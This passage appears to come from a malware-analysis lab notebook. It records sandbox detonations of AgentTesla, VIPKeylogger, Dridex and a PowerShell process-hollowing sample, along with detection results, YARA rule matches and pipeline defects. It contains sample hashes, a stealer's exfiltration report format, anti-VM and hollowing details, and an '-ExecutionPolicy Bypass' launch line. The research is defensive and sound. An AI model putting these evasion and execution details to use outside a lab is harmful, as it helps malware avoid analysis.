*guest's* image, which genuinely has **18** decodable references to `+0x6d8`;
`0bb` swept the bench's, which has **23**. The five that `0bb` treated as
missed — `0x13b92`, `0x13f04`, `0x18010`, `0x1805d`, `0x180a9` — all sit inside
the still-encrypted runs above. Two correct counts of two different images, and
the accusation was mine. `0bb`'s other content stands: the sites are real, and
`rva 0x1601b` is real and was genuinely never written down.

**Both middle links hold on the guest's own bytes.** Everything the chain
depends on is byte-identical:

    gate block  0x1601b..0x1606f          identical
    get_module_base_by_hash 0x2dc01..     identical
    the XOR decoder at 0x4181             identical
    stores into +0x6d8                    two, no third: 0x1605f and 0x26c91

**So self-modification is out**, and with it the softest of the four links.

**No ghost module either.** Every `MEM_IMAGE` allocation base in the dump is
accounted for by the `PEB->Ldr` walk or the module list — the two extras being
the second `RegSvcs` mapping at `0x990000` and `wow64cpu.dll`, both on the
64-bit side. Nothing was injected as an image and left behind.

**Where that leaves it, honestly: the diff hardened the contradiction rather
than resolving it.** All four links are now measured on the guest and they
remain mutually inconsistent. The only hypothesis still standing is **temporal**
— the `PEB->Ldr` list at *gate time* held something the list at *dump time* does
not, unlinked **and** its memory freed before the crash so that it leaves no
`MEM_IMAGE` region and no unloaded-module entry. That is exactly what a DLL
that injects, checks, and cleans up after itself would look like, and **this
dump cannot test it** — a dump is one instant and the gate ran at another.

**One loose end from the diff, kept because it is the only part unexplained.**
The fifth run, 260 bytes at `rva 0x2dd08`, is high entropy on *both* sides
(7.18 / 7.26) and is not a permutation of 0–255, so it is neither decryption
progress nor an RC4 S-box. It sits just past `get_module_base_by_hash` and the
poison thunk, contains no `+0x6d8` reference, and is on none of the four links.
Most likely a runtime scratch buffer. Not chased.

#### 0bh. THE GATE'S HASH IS A CONSTANT — a good hypothesis, falsified

`0xe11da208` is **not in stage 3's code**. The gate pushes a literal
`0x246e8fe6` and a length byte, calls the XOR decoder at `+0x4181`, and hands
the result to the lookup. `0xe11da208` is what that decoder *returned on this
bench*, once, and all four links of the crash chain had been treating it as a
constant without anyone establishing that it is one.

**The suspicion was well founded.** `0ar` caught this exact shape: a decoder
call whose literal `0x2c6e6e44` decoded to `0x77000000` — `NTDLL_BASE`, a
runtime value — and recorded the lesson *"constants are decoded before use, so a
constant lifted out of a disassembly is rarely the value."* The bench allocation
sits at `0x02001000` and the guest's at `0x01010000`; the cookie is a runtime
self-address. If any of that fed the decoder, the guest's gate hash was never
`0xe11da208`, and if what it produced instead matched one of the four modules
the guest did have loaded, the whole contradiction dissolves.

**It does not.** `scripts/gate_hash_source.py` relocates the payload by moving
`HEAP_BASE` and re-reads EAX at `rva 0x1604b`:

    allocation 0x02001000 -> 0xe11da208   at 17,165,663 blocks
    allocation 0x28001000 -> 0xe11da208   at 17,165,663 blocks
    allocation 0x40001000 -> 0xe11da208   at 17,165,663 blocks

Same value, and the *same block count* — the code is position-independent to the
instruction, which the GetPC thunks already implied.

**And relocation alone would have been a weak test**, since it does not move
`NTDLL_BASE`, the PEB or the TEB. So the decoder's reads were traced across the
call window instead:

    7,015 reads, ALL of them 0x002fe29c..0x002fe68c -- its own stack
    no PEB, no TEB, no loader list, no ntdll, no allocation

**A pure function of its two literals.** The gate's hash is `0xe11da208` on any
machine, and the chain's third link is now measured rather than assumed.

**So the hypothesis is dead and the chain is fully closed on the guest.** Every
link measured, all four mutually inconsistent, and every non-temporal
explanation eliminated: propagation (`0az`), a second store site (`0ay`),
self-modification (`0bg`), an injected-and-unlinked image (`0bg`), and now a
run-dependent hash. **What remains is the temporal reading and nothing else** —
the `PEB->Ldr` list at gate time held something the list at dump time does not.

**That is worth having even though it failed.** It was the cheapest remaining
idea, it attacked the one link nobody had checked, and killing it is what
justifies spending a detonation on the temporal question rather than continuing
to read artifacts. The next measurement has to be taken *while the gate runs*.

#### 0bi. QUEUED DETONATION — VIPKeylogger `8ceb2c53…`, predictions recorded first

**The goal changed on 17 Aug: finish the dynamic module.** The crash is not on
that path — the handoff has said so since the ranked list was written — and the
module's remaining debt is *proving*, not building. The build queue is empty,
every detector exists, and the table in *What is proven, and what is not* is
where the work is. Most of those rows need **one completed hollow**, which this
sample family has never delivered because `422e30ed` bails by design.

**The sample.** `8ceb2c538d49fe528d9219f61da05a62a5da83dd212a5ac29356c07e98b582c9`,
Triage family **VIPKeylogger**, 10/10 Triage, 100/100 Hybrid Analysis. Chosen
over two rejected candidates, and *why* they were rejected is the reusable part:

- A Snake Keylogger sample tagged `netreactor` / `ip-check` / `evasion` whose
  report named **no** hollowing target — the family usually hollows `RegAsm`,
  but "the family usually does" is not a prediction.
- `c363e567…`, rejected outright: *"anti-virtualization techniques using MAC
  address detection"*, *"contains a known anti-VM trick"*, and *"creates
  guarded memory regions (anti-debugging trick to avoid memory dumping)"* —
  the last aimed squarely at this pipeline's only evidence source. The guest is
  VirtualBox with the default `08:00:27` OUI, so the MAC check is one compare.

**Selection rule that came out of this, worth keeping:** search the *signature
text*, not the tags. `Suspicious use of SetThreadContext` is the reliable tell
for hollowing; `Injects into <name>.exe` names the host outright. Disqualify on
`MAC address detection`, `known anti-VM trick`, `guarded memory regions`.
Triage states these in plain text where ANY.RUN's tags and HA's indicator list
do not.

**Its signatures, and what each is being run for:**

| Signature | The row it is aimed at |
|---|---|
| `Suspicious use of SetThreadContext` | gap 5 `strong`; crash-dump `hollowing_target` |
| `Executes dropped EXE` | dropped-file lineage — *Fixed, unproven* |
| `SmartAssembly .NET packer` | proxy-aware call graph — *"Unproven on any other protected sample"* |
| `Command and Scripting Interpreter: PowerShell` | PowerShell lineage filter, second family |
| `Adds Run key to start application` | persistence, regression |
| Reads browser / Outlook profiles | received-file collection — *collection path unproven* |

**PREDICTIONS, recorded before the run.** The Remcos run is the precedent: four
held, three failed, and every failure was a pipeline bug rather than a property
of the sample. A run described only afterwards reads as a clean success.

1. **`chain_crashed` is false.** This sample has no anti-analysis bail in any
   report. If it crashes like `422e30ed` did, the selection rule above is
   wrong and that is the finding.
2. **`process_injection` fires, at least `present`.** `SetThreadContext` is
   observed behaviour, not a string match.
3. **Gap 5 grades `strong` *only if* the hollowed host is in
   `HOLLOWING_TARGETS`.** Triage did not name the host. **`present` is a pass,
   not a failure** — it means the sample hollows its own dropped copy, and the
   `strong` branch stays unproven for a locatable reason rather than a silent
   one. Record which host it actually used.
4. **`payload_dropped` fires with lineage `1`**, not the sample's whole write
   set. The lineage fix has never faced a run that drops.
5. **PowerShell blocks captured, `other_process_blocks_excluded: 0`.**
6. **`persistence_installed` strong** — a Run key, same shape as Remcos.
7. **`registry_read` is non-zero.** The config field is the default now and a
   pre-flight warns; a zero means the guard, not the sample.
8. **Local YARA rules scan and match nothing.** They anchor on `422e30ed`'s
   context cookie and split-API fragments. **A hit would be a false positive on
   a different family and is the most valuable failure available here.**
9. **Module integrity: 0 mismatches outside the hollowed process.** The
   measured benign rate is 0 across 300 modules in 12 programs.
10. **The WER `app_timestamp` check stays silent** unless the sample crashes.
    It needs a fault; a clean hollow gives it nothing, and that is correct.

**What would make the run void rather than negative:** the guest a commit
behind, the wrong Procmon config, or the sample failing to run at all. Check
`procmon_filter` in the summary before reading any zero — that row is *Built,
unproven* and this run proves it either way.

**RUN ORDER, all four, and the first is deliberately not the interesting one:**

1. **AgentTesla `31a762fd…` — regression first.** This file already nominates
   it: *"the fully-worked case. Any regression shows up as a change here."* It
   carries the most complete written expectation of any sample here. That
   matters more than usual because `minidump.py` gained three stream readers on
   17 Aug and `pe_carve` delegates to it — 662 tests pass, but tests passing is
   not proof on live data, and a broken dump path must surface against a sample
   whose correct output is recorded rather than against the hollowing run.
   **It is also the only sample that uploads a file**, so it is the sole route
   to received-file collection.
2. **VIPKeylogger `8ceb2c53…` — this section.** The only one that can move gap
   5's `strong` branch.
3. **Remcos `aa4d6427…`** — the second anchor. Native PE32, a deliberately
   different shape, and it exercises dropped-file lineage and carve-on-long
   paths. Redundant with run 1 as a health check, so it goes after the run that
   matters.
4. **`422e30ed…` — last, and narrow.** Its value is now a single row: the
   Split-API rule's *detection*, which nothing else can prove. It will crash
   like the eleven before it. Worth a slot only if runs 1–3 leave that row as
   the last gap.

**If only one runs, run 2.** Everything else in the table is reachable by other
means; the `strong` branch is not.

**Revert the VM between runs** — *The 03:22 re-run was void* is that lesson.

**RUN SETTINGS PER SAMPLE.** Defaults are offsets `5, 25`, spawn re-dump `10`,
max processes `20` (`memory_dump.py`; the GUI has no profile control, so the
`standard` profile's `[5, 25]` is what a blank field gives you).

| | AgentTesla | VIPKeylogger | Remcos | `422e30ed` |
|---|---|---|---|---|
| Offsets | `5, 25` *(do not tune)* | `3, 10, 25, 55` | `5, 25` | `1, 25, 55` |
| Spawn re-dump | `10` | **`2`** | `10` | `1` |
| Max processes | `20` | `24` | `20` | `24` |

**AgentTesla is untuned on purpose.** Its recorded expectation includes
*"scheduled offsets matching 0 rules"* — the finding comes from the spawn and
exit dumps. Changing the offsets invalidates the prediction that makes it a
regression test.

**VIPKeylogger's two changes are the ones that matter.** Dormancy is unknown on
a first run, and `5, 25` is exactly what bracketed FormBook's whole interesting
window. And the spawn re-dump default is documented as *"an estimate, not a
measurement"*: hollowing completes in well under a second, hollowed children
here have lived **2.14s and 3.03s**, and a 10s re-dump lands after they are
gone. At `2` the before/after pairing that gap 5 exists to exercise actually
fires. The cap counts **dumps, not processes** — sample, `powershell.exe`,
`conhost.exe`, a dropped EXE and a hollowed target at three dumps each is ~18
against 20, and a cap that binds drops the image the run is for.

**Cross-cutting:** launch elevated (ProcDump needs it); confirm the preflight
strip; verify the Procmon config is `dynamic_registry_reads.pmc` and that
`config.json` has not pinned the old one — three consecutive runs were lost to
that; extend-if-dormant **on** for all four, since none of these is resident.
Export the HTML, `dynamic_run_summary.json` and **`network\received\`** before
reverting. `process cap reached` or `exited before its +Ns re-dump` in the
skipped list means raise the cap or lower the re-dump and run again.

#### 0bj. RUN `c175a970`, 18 Aug — AgentTesla re-run, and a rule that generalises

**Run 1 of the four-sample plan (`0bi`), and it did its job twice over:** it
confirmed the pipeline is healthy after four days of heavy change, and it
retired three rows of *What is proven, and what is not*.

**Settings, per `0bi`: untuned on purpose.** `standard` profile, offsets
`[5, 25]`, spawn re-dump `10`, 180s base window. The whole point of run 1 was
that its expected output is recorded, so tuning it would have destroyed the
comparison.

**What held:**

    score 85 · Likely Malicious / High     exactly as recorded
    all 5 dumps Frozen                     suspended at capture
    ftp.cyberflor.co                       present, from the sample
    FTP control 192.0.2.123:21             + passive :60009, recorded range 60000-60010
    chain_crashed false                    no bail
    network_isolation contained            single egress, Ethernet 2
    observation: 0 extensions              activity_observed, window_elapsed

The adaptive window behaved exactly as the code says it must: extension fires
only while *nothing has been observed*, and this sample acts, so it never
engaged. That is worth stating because a run that never extends looks identical
to one where extension is broken.

**Three rows retired.**

- **Received-file collection — PROVEN.** `FakeNet.html`, state `overwritten`,
  sha256 recorded, under the case's `network/received/`. That row read *"the
  collection path is still unproven — nothing has been uploaded since it was
  written."* This is why AgentTesla was run first.

  **And the content is the sample's own report, not an untouched FakeNet
  page** -- checked, because "a file arrived" and "the exfil arrived" are
  different claims. It matches the recorded format exactly:

      Time: / User Name: / Computer Name: / OSFullName: / CPU: / RAM:
      <hr>
      Host: / Username: / Password: / Application:   x2, IE/Edge

  **That makes the format a confirmed durable signature across runs** -- 03 Aug
  and 18 Aug, two captures, same shape. This file has noted that a rule could
  be written against a captured upload rather than against a binary; there are
  now two specimens to write it from. Not built, and not queued.

  **Nothing sensitive left the lab, and the reason is worth knowing.** The two
  harvested "credentials" are Windows' *own* Credential Manager entries --
  `SnapshotEncryptionKey` and `SnapshotEncryptionIV`, both under a
  MicrosoftStore-Installs account, attributed to `IE/Edge`. A clean baseline
  has no saved browser passwords, so what a stealer gets here is the vault
  Windows populates itself. The values are deliberately not reproduced here.

  **Two baseline properties the exfil measured for free.** It reported
  `RAM: 7981.7 MB` and the host's real CPU model. Both are *helpful*: 8 GB and
  a real desktop CPU are what a physical machine looks like, and samples that
  bail on under-provisioned hardware -- a common cheap sandbox check -- have
  nothing to catch here. Worth remembering if the baseline is ever rebuilt
  smaller.
- **`procmon_filter` in the summary — PROVEN.** `dynamic_registry_reads.pmc`,
  `readable: true`, `captures_registry_reads: true`, 18 operations, read from
  the file rather than the filename. The setting that voided three runs now
  reports itself.
- **Module integrity on a sample outside its fixture** — 297 modules compared,
  0 replaced, 0 header mismatches. The measured benign rate holds off-fixture.

Also confirmed in passing: `vm_check_and_bail` returned `no_vm_check` **with
registry reads actually captured**, which is the guard working rather than a
silent zero; and the parent-at-spawn limit recorded itself honestly again —
*"parent exited before it could be imaged at the spawn of pid 9016"* — which is
the named-reason record rather than a missing dump.

**THE FINDING: `RingForge_Split_API_Injection_Loader` matched AgentTesla.**

It matched **all five dumps**, including the parent at t5 and t25 where *no*
AgentTesla rule matched. That is what moved two of the three recorded
expectations, and it is the first time one of this project's own rules has
fired on a family it was not written for.

**Checked rather than believed, because three explanations fitted.** The rule's
condition requires `$resolve = "GetDelegateForFunctionPointer" ascii wide`,
so its presence is decisive:

    kernel      26   (wide)        32.dll     331   (wide)
    Virtual     29   (wide)        Alloc       40   (wide)
    GetDelegateForFunctionPointer   ascii 6, wide 0

**The mandatory string is present, in ascii.** The first count of it tested only
UTF-16 and read 0, which looked like the rule matching without a required
string. It is ascii because **.NET metadata strings are UTF-8**: an ascii
`GetDelegateForFunctionPointer` is precisely what a metadata reference to
`Marshal.GetDelegateForFunctionPointer` looks like. And the scanned ruleset was
**hash-identical** to `tools/yara/local/`
(`1210b092ac795aeb95c1af95cfc024dff28bcc6239dc7ff422ef15f3bd87ac8b`), so this is
not ruleset drift — which was the leading hypothesis and was wrong.

So it is a **true positive on the technique**. `"kernel "` ×26 and `"Virtual "`
×29 as *space-suffixed* UTF-16 literals are not something an ordinary assembly
holds, and AgentTesla's packer resolves reassembled API names through the same
`GetDelegateForFunctionPointer` route the rule was written against. The rule's
own header called this in advance — *"the splitting is a property of the evasion
rather than of the family"* — and it behaves that way.

**Why that is the more valuable outcome.** Nearly every detector here is proven,
where proven at all, on one loader family. A rule that fires on two unrelated
families with its mandatory strings verified is generalisation evidence, which
is the thing the module actually needs. `packed_payload` citing it is
legitimate, not inflated.

> **A near-miss in the verification, worth recording.** The first check counted
> all five strings as UTF-16 only, against a rule that declares one of them
> `ascii wide`. The 0 it produced was consistent with a serious defect — a rule
> matching without a mandatory string — and the next step would have been to
> chase a scanning bug that does not exist. **A verification command has to
> match the rule's own encodings**, and the rule states them in the line above
> the string.

#### 0bk. RUN `e8ab2151`, 18 Aug — VIPKeylogger scores 165, and gap 5 still will not fire

**Run 2 of `0bi`, at the settings that section specified** — offsets
`[3, 10, 25, 55]`, spawn re-dump `2`, max processes `24`. **165 · Likely
Malicious / High, six categories, two strong: the highest score this pipeline
has produced**, against a previous best of 125 on Remcos.

**THE TEN PREDICTIONS: seven held, one was badly specified, two missed — and
both misses are the author's, not the pipeline's.**

| # | Predicted | Result |
|---|---|---|
| 1 | `chain_crashed` false | **held** — 0 event crashes, no bail |
| 2 | `process_injection` at least `present` | **held** — present |
| 3 | gap 5 `strong` only if the host is a hollowing target | **held as written** — `present` |
| 4 | `payload_dropped` with lineage, not the whole write set | **held**, see below |
| 5 | PowerShell captured, `other_process_blocks_excluded: 0` | **held** — 13 blocks, 12 from the sample, 0 |
| 6 | `persistence_installed` **strong** | **MISSED** — `present` |
| 7 | `registry_read` non-zero | **held** — 158,984 |
| 8 | local rules match nothing | **MISSED** — Split-API matched 10 of 12 |
| 9 | module integrity 0 mismatches | **held** — 732 compared, 0 |
| 10 | WER `app_timestamp` silent without a crash | **held** — silent |

**Prediction 6 was wrong about the sample, not the detector.** `strong` is
`persistence_total >= 2` and this sample writes **one** autoruns entry. The
prediction assumed Remcos's shape, which wrote a Run key to *both* HKCU and
`HKLM\Wow6432Node` and so cleared a count threshold. One entry is one entry;
the detector is right and the prediction was pattern-matching on a different
sample.

**Prediction 4 was badly specified and should not be scored as a pass.** It said
"lineage `1`" — a guessed *count* dressed as a prediction. The run dropped two,
both genuinely the sample's own `file_create` events:
`%APPDATA%\whcjHybcIRKrlH.exe` and `%TEMP%\wdb0msxfxca.ps1`. What was actually
worth predicting — that lineage attributes the drops to the sample rather than
sweeping in a browser's writes — **held**, and `payload_dropped` graded
**strong**. Retires *dropped-file lineage*, which had read *Fixed, unproven*.

**Prediction 8 was superseded by `0bj` before this run happened.** It was
written when a local-rule hit would have been a false positive. `0bj` then
established that `RingForge_Split_API_Injection_Loader` is a *technique* rule
with its mandatory strings verified. It matched **10 of 12 dumps** here — a
**third** family — and that is the rule working, not failing.

**And the rule set discriminated exactly as it should.** The technique rule
fired; the family-specific rules — `ContextCookie` and `Loader_Stage2`, written
against `422e30ed` — **stayed silent on a different family.** Generalisation
where it was designed in, and no bleed where it was not. Memory-only rules:

    RingForge_Split_API_Injection_Loader   10 of 12 dumps
    Windows_Trojan_SnakeKeylogger_af3faa65  3
    Windows_Trojan_AgentTesla_d3ac2b2f      1

(Both stealer signatures firing on one sample is ordinary for this cluster;
Triage called it VIPKeylogger.)

**THE HEADLINE, AND IT IS A PROBLEM WITH THE GATE RATHER THAN THE SAMPLE.**
`unmapped_in_hollowing_target: 0`. The carver found **one** unmapped PE — x86
.NET, 81,920 bytes, compiled 2026-05-20, at `0x5600000` — and it is in the
**sample's own process** (pid 4952). The tree is:

    4952  the sample
    11132   powershell.exe        -> conhost 11996
    9460    the sample again      <- self-spawn, same image

**No `RegAsm`, no `RegSvcs`, no `MSBuild`, no `vbc`.** Triage's
`Suspicious use of SetThreadContext` was real, but the thread it redirected was
in a copy of *itself*, not in a system utility.

**That is now three samples and a pattern.** `422e30ed` bails by design;
AgentTesla self-spawns; this one self-spawns. **Gap 5's `strong` branch requires
the host to be in `HOLLOWING_TARGETS`, and this entire family cluster does not
use that technique.** The branch has been unproven since it was written, and the
reason is looking less like "we have not found the right sample" and more like
**the gate is aimed at a technique that modern .NET stealers have moved away
from**. Self-injection into a process the sample spawned from its own image is
just as malicious and appears to be commoner.

**That is a design question and it is deliberately not answered here:** should
`strong` also fire on an unmapped executable PE inside a process the *sample
itself* spawned, or is the current gate correct and simply rare? Changing a
scoring gate to make a row go green is exactly the pressure this project's
score design exists to resist. It wants a decision, not a quiet edit.

**What the run retired anyway:** dropped-file lineage (above); the PE carver's
`unmapped` classification on live data with **12 dumps analysed, 0 failures, 30
`resource_only` correctly set aside, 1 carved**; module integrity at 732
modules; and `vm_check_and_bail` returning `no_vm_check` with 158,984 registry
reads actually behind it.

**One setting drifted and it cost nothing.** `adaptive_observation: false` and
`adaptive_available: false` this run, where run 1 had both true. The sample
acted well inside the base window so nothing was lost, but `0bi` specified
extend-if-dormant **on** and a run that cannot extend records that it could not
rather than pretending the window was adequate. Worth confirming which of the
two — unticked, or no activity probe — before run 3.

#### 0bl. QUEUED — a PowerShell RunPE as gap 5's first real CONTROL, and a Dridex chaser

**`0bk` left gap 5's `strong` branch unproven for the third time, and the reason
had stopped being "no sample yet".** Three real stealers in a row self-inject
rather than hollow a system utility, which made "the gate is aimed at a
technique this cluster abandoned" a live reading that could not be
distinguished from "we picked badly". **A control settles that, and gap 5 has
never had one** -- unlike `memory_canary` and `upx_control`, which exist for
exactly this reason.

**QUEUED FIRST — `af2d83008fff89591cf33cdbadf50b3d9eaa68d3057eda9b4f04a771121d2abc`**
(`malware_sample.ps1`, 1,091,668 bytes, UTF-16LE, first seen 2026-02-13, tags
`powershell` / `process hollowing` / `ps1`, no family signature).

**Why a script beats another sample here, and it is not convenience:**

- **The hollowing code arrives in plaintext.** `build_dynamic_launch_command`
  runs a `.ps1` through `powershell.exe -NoProfile -ExecutionPolicy Bypass
  -File`, so ScriptBlock logging captures the script. **The target process name
  is readable from this run's own collector** rather than from someone else's
  tags -- which is the criterion that failed twice, on the Snake candidate and
  again on `8ceb2c53...`.
- **No family signature and an individual reporter reads as a PoC**, so **no
  anti-VM**. Every ambiguous result so far has been "did it bail, or is the
  detector wrong?" A script without evasion deletes that question.
- **1 MB of UTF-16 means an embedded PE**, carried as base64 or a byte array --
  ~545 KB of text. Public RunPE scripts overwhelmingly target `svchost.exe`,
  `notepad.exe` or `explorer.exe`, all three in `HOLLOWING_TARGETS`.

**And the conclusion is clean whichever way it goes.** `strong` fires and gap 5
closes on a case whose mechanism was read rather than inferred. `strong` does
**not** fire on a hollow whose source code is in the report, and the gate is
**proven** mis-aimed rather than suspected -- which is what would justify the
scoring change `0bk` declined to make unilaterally.

**PREDICTIONS, recorded first:**

1. The root process is **`powershell.exe`**, not the script. Lineage has to
   reach a hollowed **grandchild**; that is a second thing this run tests.
2. ScriptBlock capture succeeds on a very large block. `0bk` handled 330,694
   bytes; this is bigger. `blocks_from_sample > 0`,
   `other_process_blocks_excluded: 0`, `incomplete_blocks: 0` -- **an
   incomplete block would void the main deliverable**, since the target name
   lives in the text.
3. **The captured text names the hollowed process.** Record it verbatim. This is
   the artifact the run exists for.
4. `scripted_execution` fires -- it is a PowerShell script by construction.
5. If the target is in `HOLLOWING_TARGETS`, `process_injection` grades
   **`strong`**, and **the route matters more than the grade**: expect
   `module_header_mismatch_in_target > 0`. A textbook RunPE writes the payload
   over the host at its own base, which classifies `at_module_base` and is the
   carver's documented blind spot -- so `unmapped_pe_in_hollowing_target` may
   well stay 0. **Module integrity has never caught a real hollow either**, so
   that route firing is its own result.
6. `chain_crashed` false.
7. `RingForge_Split_API_Injection_Loader` **does not** match. A PowerShell RunPE
   typically resolves through `Add-Type` P/Invoke rather than
   `GetDelegateForFunctionPointer`, and the rule requires that string. **A match
   here would be a fourth family and would say the technique rule reaches
   further than the .NET-loader population it was written from.**
8. Dropped files may be **zero** -- the payload can live entirely in the script.
   A zero here is a real negative, not a collector failure, and
   `dropped_files_summary` distinguishes them.

**QUEUED SECOND —
`e30b76f9454a5fd3d11b5792ff93e56c52bf5dfba6ab375c3b96e17af562f5fc`** (Dridex,
176,128 bytes, exe, 2021-04-20, tags `Dridex` / `process hollowing` / `RunPE`,
reporter `struppigel`). **Real malware, native rather than .NET -- a fourth
distinct shape** -- and from the era when hollowing into system binaries was
standard. It runs *after* the control, because 2021 Dridex loaders are known
for anti-analysis and a bail would restore exactly the ambiguity the control
removes.

**Settings for both:** offsets `3, 10, 25, 55`, spawn re-dump **`2`**, max
processes `24`. A hollow completes in well under a second and the host is
short-lived, which is the `0bk` reasoning unchanged.

**One transfer note, earned this session.** The `.ps1` is **UTF-16LE**. Verify
its SHA256 *on the guest after transfer* -- an encoding conversion in transit
would leave a file that still looks like a script and no longer runs, and this
session has already lost a path to a stray carriage return.

#### 0bm. RUN `33fe6c3b`, 18 Aug — the control worked, and it refutes `0bk`

**The `.ps1` control from `0bl` ran, and it did what a control is for: it put
the failure somewhere unambiguous. It is not where this file predicted.**

**The hollowed process is named at last: `SecurityHealthHost.exe`**, a child of
`powershell.exe` alongside `csc.exe` — the C# compiler, which is `Add-Type`
doing P/Invoke exactly as `0bl` predicted.

    10920  powershell.exe             <- the sample
     7708    csc.exe                  <- Add-Type
     6216    SecurityHealthHost.exe   <- THE HOLLOWED TARGET

It is **not** in `HOLLOWING_TARGETS`, so `strong` could not have fired on it.
But that turns out not to be why nothing fired.

**BOTH DUMPS OF IT FAILED, and the error is the finding:**

    pid 6216  process-spawn  t143   "Target process no longer running"
    pid 6216  spawn-redump   t145   "Target process no longer running"
                                    0x8007012B — only part of a
                                    ReadProcessMemory request was completed

**The hollowed process lived under two seconds and the event-driven trigger lost
the race.** `dumps_attempted: 7, succeeded: 5, skipped: 1` — the single failure
is the only process that mattered.

**That retracts a claim this file makes.** The run-`0aw` note reads: *"The
standing advice that 'no scheduled offset can catch a 3-second child' was true
and incomplete — the event-driven triggers are not scheduled offsets, and they
do not care how short the life is."* **They do care.** The spawn event is
observed, ProcDump is launched, and the process can be gone before it attaches.
There is a race between notification and attach, and nothing had measured it.
Lowering the re-dump to `2` did not help, because the *first* dump — at spawn —
lost too.

**So `process_injection` never fired at all**, not even `present`. Module
integrity compared **380 modules, every one from `powershell.exe`, all
identical**; the carver reported no unmapped images. **No detector was given the
hollowed process to look at.**

**Which refutes `0bk`'s hypothesis, and that is the value of the run.** After
three self-injecting stealers this file proposed that gap 5's gate *"is aimed at
a technique modern .NET stealers have largely abandoned."* The one run built to
test that shows something else: a real hollow, into a real Windows binary, that
no detector could see **because the image was never captured**. **This is a
collection failure, not a scoring one**, and the scoring change `0bk` floated
would not have helped. **Do not make it on this evidence.**

**Gap 5's `strong` branch is still unexplained rather than explained** — four
samples, four different reasons: `422e30ed` bails, AgentTesla and `8ceb2c53…`
self-inject, and this one hollowed a target the watcher could not hold still.

**A false-positive class, and a wide one.** `payload_dropped` graded **strong**
on two files:

    C:\Users\adam\AppData\Local\Temp\zrudxjpg\zrudxjpg.dll
    C:\Users\adam\AppData\Local\Temp\hryya5bb\hryya5bb.dll

Both are **`csc.exe` output** — the temporary assemblies `Add-Type` compiles
inline C# into. Lineage is correct (`source_process_name: powershell.exe`) and
the classification is defensible in isolation, but **every PowerShell script
calling `Add-Type` drops these**, and that population includes a great many
legitimate administrative scripts. A category reaching `strong` on compiler
scratch files is the volume-driven model the score design exists to avoid.
`missed_descendants` recording `cvtres.exe` under `csc.exe` is the corroborating
detail.

**ScriptBlock capture did not get the script**, which cost the run its headline
deliverable. `blocks_total: 13, blocks_from_sample: 3,
analyzer_blocks_excluded: 9, blocks_suspicious: 0` — and the three sample blocks
are **4, 50 and 5 characters long**, against a **1,091,668-byte UTF-16 script**.
`scripted_execution` did not fire on a PowerShell script.

**The 9-of-13 analyzer exclusion is what to look at**, because run `e8ab2151`
saw `blocks_total: 13` with `analyzer_blocks_excluded: 1` and 12 from the
sample. Same total, inverted split. **If the analyzer filter is eating the
sample's own blocks, that is the fifth instance of the attribution bug class
this file already records four of** — and it is unproven either way, because a
1 MB script may simply not be logged whole. It needs the raw
`Microsoft-Windows-PowerShell/Operational` events, not the summary.

**A performance defect, measured.** Module integrity took roughly 24 of this
run's 27 minutes: five `powershell.exe` dumps totalling **1,110 MB**, 380
modules. The cause is `_CACHE_LIMIT = 96` with a wholesale `.clear()` —
PowerShell carries well over 96 modules, so the reference cache thrashes and
every relocation is recomputed. Measured on the bench, a full `pefile` parse
plus relocation averages **1,105 ms** per module (`shell32` 1.9 s,
`windows.storage` 2.2 s), so ~750 uncached parses is ~14 minutes here and more
on the guest.

> **The obvious fix was measured and does not work.** `fast_load=True` parsing
> only `IMAGE_DIRECTORY_ENTRY_BASERELOC` gives **1.1x**, not the 5–10x it looks
> like it should: `relocate_image` forces the parse regardless, so the resource
> tree is not the cost. **The fix is the cache — LRU eviction instead of a
> wholesale clear, or a limit above the observed module count — not the parse
> mode.** Recorded so nobody spends an afternoon re-deriving it.

**Three build items fall out, none queued yet:** the spawn-dump race, the
`Add-Type` false-positive class, and the module-integrity cache. **All three are
pipeline defects found by a control**, which is the argument for having built
one.

#### 0bn. RUN `677547d9`, 18 Aug — MODULE INTEGRITY CATCHES A REAL HOLLOW, and the carver's blind spot is confirmed live

**Dridex `e30b76f9…`, the `0bl` chaser. 130 · Likely Malicious / High, five
categories, and — for the first time — the module-integrity route fired on a
genuine process hollow.**

**No dump race this time: 7 attempted, 7 succeeded.** The `0bm` failure was a
property of a sub-second PoC target, not a general defect in the trigger. That
is the second measurement the fix needed, and it narrows the race to processes
that die within about a second of being spawned.

**It self-spawned rather than hollowing a system binary:**

    8960  e30b76f9….exe      <- the sample
    7328    e30b76f9….exe    <- a copy of itself, hollowed

So `…_in_hollowing_target` is 0 across every route and **`strong` could not
fire**. That is now the pattern on four of five samples.

**THE FINDING — `header_mismatch`, ten times, with the identity that proves it:**

    module in memory : timestamp 1448023611, SizeOfImage 102400
    file on disk     : timestamp 1448192354, SizeOfImage 180224
    base             : 0x400000

**A 100 KB image running at `0x400000` where the file it was started from is
180 KB.** Different build, different size, same base — a textbook RunPE, and it
is detected **by identity rather than by degree**, which is precisely the case
the `0ax`-era false-negative fix was made for. `modules_compared: 314`,
`identical: 314`, `header_mismatch: 10`.

**Module integrity has never done this before.** Its benign rate was measured
(0 across 300 modules in 12 programs) and its one previous live attempt failed
for a locatable reason — there was no `RegSvcs` image to examine. **It works.**

**AND THE CARVER'S BLIND SPOT IS CONFIRMED ON REAL MALWARE.**
`unmapped_images: 0`, `carved: 0`, `dumps_analyzed: 7`. Gap 5's own note says
the classic overwrite-in-place hollow *"classifies as `at_module_base` and is
invisible: the module list is read from the same memory"*. **That has now been
observed rather than reasoned about**, on a sample that demonstrably hollowed
something.

**Which makes the architecture right and the row wrong.** The two detectors are
complementary exactly as designed: the carver cannot see an overwrite-in-place
hollow, and module integrity catches it. **Gap 5 — the *carver's* `strong`
branch — remains unproven, and it is now unproven for a fully understood
reason** rather than an unknown one. The carver needs a payload mapped at an
address the module list does not cover; RunPE by construction does not produce
one.

**That reframes what gap 5 is waiting for.** Not "a sample that hollows" — this
was one — but specifically **a loader that maps its payload somewhere the host's
module list does not reach, into a process in `HOLLOWING_TARGETS`.**
`422e30ed` is exactly that shape (stage 3 at `RegSvcs`'s preferred base with the
real image relocated away) and it is the sample that bails. **The row may be
waiting on the crash after all**, which is the opposite of what `0bk` concluded
and consistent with `0bm` refuting it.

> **A reporting bug, on this run's own card.** `process_injection` reads
> `detail: "0 injection event(s) …"` and, directly beneath it,
> `reason: "Sysmon recorded process injection (CreateRemoteThread)."` The reason
> is chosen by a conditional chain that has no branch for the
> module-integrity-only case, so it falls through to a claim **the detail line
> on the same card contradicts**. Nothing is mis-scored; the explanation shown
> to a reader is simply false. Worth fixing before anyone reads a report and
> believes Sysmon saw something.

**One loose end.** The sample's own image is `no_reference` in the two parent
